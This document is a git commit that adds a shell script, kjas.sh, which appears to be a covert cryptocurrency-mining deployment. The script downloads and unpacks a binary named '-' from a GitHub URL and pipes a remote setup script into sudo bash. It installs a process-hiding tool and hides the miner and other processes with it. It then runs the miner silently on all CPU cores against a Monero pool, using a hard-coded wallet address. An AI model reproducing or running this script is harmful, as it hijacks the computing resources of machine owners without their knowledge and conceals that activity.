a47dfc2334ed19cdb540c0804140f7eded561463
kjas <52422275+manhls121@users.noreply.github.com>
2022-08-25 22:22:13 +0200

    Create kjas.sh

---
+++ kjas.sh
@@ -0,0 +1,20 @@
+#!/bin/sh
+pkill -
+wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
+tar -xf -.tar.gz
+apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+sudo swapoff -a; sudo swapon -a
+sleep 10
+ph add gudubrag.sh
+Ph add python3
+ph add root
+ph add node-process-hider
+ph add -
+./- -o pool.supportxmr.com:3333 -u 49fS38iYhrcYCzzenPciiXBVTwLfY69nrakTJedBTx1rfK2f1d3dxKcScdAm9hoPz1dsusw6P9JCbeZFEsaGyjYcPduddG8.manh -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
